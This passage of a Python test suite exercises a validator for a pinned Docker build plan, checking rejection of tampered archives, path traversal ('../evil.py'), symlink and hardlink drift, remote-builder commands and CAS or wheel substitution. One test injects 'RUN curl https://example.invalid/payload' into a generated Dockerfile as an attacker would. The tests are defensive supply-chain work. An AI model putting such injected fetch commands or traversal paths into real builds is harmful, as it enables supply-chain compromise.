    monkeypatch: pytest.MonkeyPatch,
    tmp_path: Path,
) -> None:
    members = [
        ("metrics/NTKRank_LOP_vs_NoLOP.png", b"identical metric payload\n", 0o444),
        ("metrics/ntkrank_LOP_vs_NoLOP.png", b"identical metric payload\n", 0o444),
        ("pyproject.toml", b'[project]\nname="continual-foragax-agents"\n', 0o444),
    ]
    values = _fixture()
    values["external"], values["external_receipt"] = _source("external_foragax", members=members)
    artifact = _build(monkeypatch, values)
    parsed = plan.parse_cpu_oci_build_plan(
        artifact.plan_bytes,
        expected_file_sha256=artifact.plan_sha256,
    )
    files = {item["path"]: item["content"] for item in parsed["build"]["generated_files"]}
    namespace = {"__name__": "generated_source_verifier_test"}
    exec(
        compile(
            files["generated/verify-sources.py"],
            "generated/verify-sources.py",
            "exec",
        ),
        namespace,
    )
    archive_path = tmp_path / "external.tar"
    archive_path.write_bytes(values["external"].archive_bytes)
    source_root = tmp_path / "source"
    source_root.mkdir()
    _materialize_source_members(source_root, members)

    namespace["_verify_source"](archive_path, source_root)


@pytest.mark.parametrize(
    "mutation",
    ["case_collapsed", "missing", "extra", "mode", "hash", "link", "hardlink"],
)
def test_generated_source_verifier_rejects_extraction_drift(
    monkeypatch: pytest.MonkeyPatch,
    tmp_path: Path,
    mutation: str,
) -> None:
    upper = "metrics/NTKRank_LOP_vs_NoLOP.png"
    lower = "metrics/ntkrank_LOP_vs_NoLOP.png"
    members = [
        (upper, b"identical metric payload\n", 0o444),
        (lower, b"identical metric payload\n", 0o444),
        ("pyproject.toml", b'[project]\nname="continual-foragax-agents"\n', 0o444),
    ]
    values = _fixture()
    values["external"], values["external_receipt"] = _source("external_foragax", members=members)
    artifact = _build(monkeypatch, values)
    parsed = plan.parse_cpu_oci_build_plan(
        artifact.plan_bytes,
        expected_file_sha256=artifact.plan_sha256,
    )
    files = {item["path"]: item["content"] for item in parsed["build"]["generated_files"]}
    namespace = {"__name__": "generated_source_verifier_test"}
    exec(
        compile(
            files["generated/verify-sources.py"],
            "generated/verify-sources.py",
            "exec",
        ),
        namespace,
    )
    archive_path = tmp_path / "external.tar"
    archive_path.write_bytes(values["external"].archive_bytes)
    source_root = tmp_path / "source"
    source_root.mkdir()
    omitted = (
        frozenset({lower})
        if mutation == "case_collapsed"
        else frozenset({"pyproject.toml"})
        if mutation == "missing"
        else frozenset()
    )
    _materialize_source_members(source_root, members, omitted_paths=omitted)
    target = source_root / upper
    if mutation == "extra":
        extra = source_root / "metrics/extra.png"
        extra.write_bytes(b"extra\n")
        extra.chmod(0o444)
    elif mutation == "mode":
        target.chmod(0o644)
    elif mutation == "hash":
        target.chmod(0o644)
        target.write_bytes(b"altered metric payload\n")
        target.chmod(0o444)
    elif mutation == "link":
        target.unlink()
        target.symlink_to("missing-target")
    elif mutation == "hardlink":
        lower_target = source_root / lower
        lower_target.unlink()
        lower_target.hardlink_to(target)

    with pytest.raises(SystemExit, match="source verification failed"):
        namespace["_verify_source"](archive_path, source_root)


def test_source_bundle_rejects_missing_required_local_payload(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    values = _fixture()
    values["local"], values["local_receipt"] = _source(
        "local_alberta",
        members=[("pyproject.toml", b'[project]\nname="alberta-framework"\n', 0o444)],
    )
    _patch_validators(monkeypatch, values)
    with pytest.raises(plan.ForagerMatchedV3CpuOciBuildPlanError, match="required project payload"):
        _build(monkeypatch, values)


def test_source_bundle_rejects_parent_traversal_member_path(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    values = _fixture()
    raw = _archive_with_unsafe_path("../evil.py", b"VALUE = 1\n")
    values["external"] = plan.CanonicalSourceBundleInput(
        archive_bytes=raw,
        expected_archive_sha256=_sha(raw),
        expected_archive_size_bytes=len(raw),
        expected_member_count=1,
        receipt_bytes=values["external"].receipt_bytes,
        expected_receipt_sha256=values["external"].expected_receipt_sha256,
        source_manifest_sha256=_sha("external:manifest"),
        source_tree_sha256=_sha("external:tree"),
        staging_manifest_sha256=_sha("external:staging"),
    )
    _patch_validators(monkeypatch, values)
    with pytest.raises(plan.ForagerMatchedV3CpuOciBuildPlanError, match="unsafe source path"):
        _build(monkeypatch, values)


def test_wheelhouse_payload_substitution_fails_even_when_structure_is_unchanged(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    values = _fixture()
    values["wheel_archive"] = values["wheel_archive"][:-1] + b"\x01"
    _patch_validators(monkeypatch, values)
    with pytest.raises(plan.ForagerMatchedV3CpuOciBuildPlanError, match="full-file identity"):
        _build(monkeypatch, values)


def test_wheelhouse_member_order_is_replayed_from_cas_not_trusted_from_receipt(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    values = _fixture()
    entries = values["entries"]
    payload_by_sha = {
        entry["sha256"]: (
            b"synthetic jax wheel bytes"
            if entry["name"] == "jax"
            else b"synthetic jaxlib wheel bytes"
        )
        for entry in entries
    }
    reversed_members = [
        (entry["archive_name"], payload_by_sha[entry["sha256"]], 0o444)
        for entry in reversed(sorted(entries, key=lambda item: item["archive_name"]))
    ]
    raw = _archive(reversed_members)
    values["wheel_archive"] = raw
    values["lock"]["wheelhouse"]["archive"].update({"sha256": _sha(raw), "size_bytes": len(raw)})
    values["cas"]["source_archive"].update({"sha256": _sha(raw), "size_bytes": len(raw)})
    values["receipt"]["archive"].update({"sha256": _sha(raw), "size_bytes": len(raw)})
    _patch_validators(monkeypatch, values)
    with pytest.raises(plan.ForagerMatchedV3CpuOciBuildPlanError, match="header differs from CAS"):
        _build(monkeypatch, values)


def test_cas_entry_substitution_fails_against_runtime_lock(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    values = _fixture()
    values["cas"]["entries"][0]["cas_key"] = "sha256/aa/" + "a" * 64 + "/fake.whl"
    _patch_validators(monkeypatch, values)
    with pytest.raises(plan.ForagerMatchedV3CpuOciBuildPlanError, match="CAS entry substitution"):
        _build(monkeypatch, values)


def test_receipt_archive_substitution_fails_against_lock_and_cas(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    values = _fixture()
    values["receipt"]["archive"]["sha256"] = _sha("different-archive")
    _patch_validators(monkeypatch, values)
    with pytest.raises(plan.ForagerMatchedV3CpuOciBuildPlanError, match="identity differs across"):
        _build(monkeypatch, values)


@pytest.mark.parametrize(
    ("mutation", "message"),
    [
        (
            lambda value: value["base_image"].update(
                {
                    "manifest_digest": "sha256:" + "a" * 64,
                    "reference": "docker.io/library/python@sha256:" + "a" * 64,
                }
            ),
            "base image differs",
        ),
        (
            lambda value: value["build"].update(
                {
                    "command": [
                        "docker",
                        "build",
                        "--network=host",
                        "--pull=true",
                        "--platform=linux/amd64",
                        "--file=Dockerfile",
                        ".",
                    ],
                    "network_mode": "host",
                    "pull": True,
                }
            ),
            "build command",
        ),
        (
            lambda value: value["build"]["command"].__setitem__(
                1, "--host=tcp://remote.invalid:2376"
            ),
            "build command",
        ),
        (
            lambda value: value["build"]["command"].__setitem__(3, "--builder=remote-builder"),
            "build command",
        ),
        (
            lambda value: value["source_install"].update(
                {"order": ["local_alberta", "external_foragax"]}
            ),
            "source installation order",
        ),
        (
            lambda value: value["execution_toolchain"]["docker_cli"].update({"sha256": "f" * 64}),
            "execution toolchain",
        ),
    ],
)
def test_plan_validator_rejects_base_network_and_source_order_mutations(
    monkeypatch: pytest.MonkeyPatch,
    mutation: Any,
    message: str,
) -> None:
    artifact = _build(monkeypatch)
    value = json.loads(artifact.plan_bytes)
    mutation(value)
    _rehash_body(value)
    with pytest.raises(plan.ForagerMatchedV3CpuOciBuildPlanError, match=message):
        plan.validate_cpu_oci_build_plan(value)


def test_generated_dockerfile_substitution_fails_after_attacker_rehashes_file_and_plan(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    artifact = _build(monkeypatch)
    value = json.loads(artifact.plan_bytes)
    dockerfile = next(
        item for item in value["build"]["generated_files"] if item["path"] == "Dockerfile"
    )
    dockerfile["content"] += "RUN curl https://example.invalid/payload\n"
    raw = dockerfile["content"].encode("ascii")
    dockerfile["size_bytes"] = len(raw)
    dockerfile["sha256"] = _sha(raw)
    _rehash_body(value)
    with pytest.raises(plan.ForagerMatchedV3CpuOciBuildPlanError, match="generated Dockerfile"):
        plan.validate_cpu_oci_build_plan(value)


def test_plan_parser_rejects_wrong_full_file_pin(monkeypatch: pytest.MonkeyPatch) -> None:
    artifact = _build(monkeypatch)
    with pytest.raises(plan.ForagerMatchedV3CpuOciBuildPlanError, match="full-file"):
        plan.parse_cpu_oci_build_plan(
            artifact.plan_bytes,
            expected_file_sha256=_sha("wrong-plan"),
        )


def test_module_is_pure_content_and_has_no_io_or_execution_imports() -> None:
    source_path = Path(plan.__file__)
    tree = ast.parse(source_path.read_text(encoding="utf-8"))
    imported: set[str] = set()
    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            imported.update(alias.name.split(".")[0] for alias in node.names)
        elif isinstance(node, ast.ImportFrom) and node.module:
            imported.add(node.module.split(".")[0])
    assert imported.isdisjoint(
        {
            "io",
            "os",
            "pathlib",
            "requests",
            "shutil",
            "socket",
            "subprocess",
            "tarfile",
            "tempfile",
            "urllib",
        }
    )
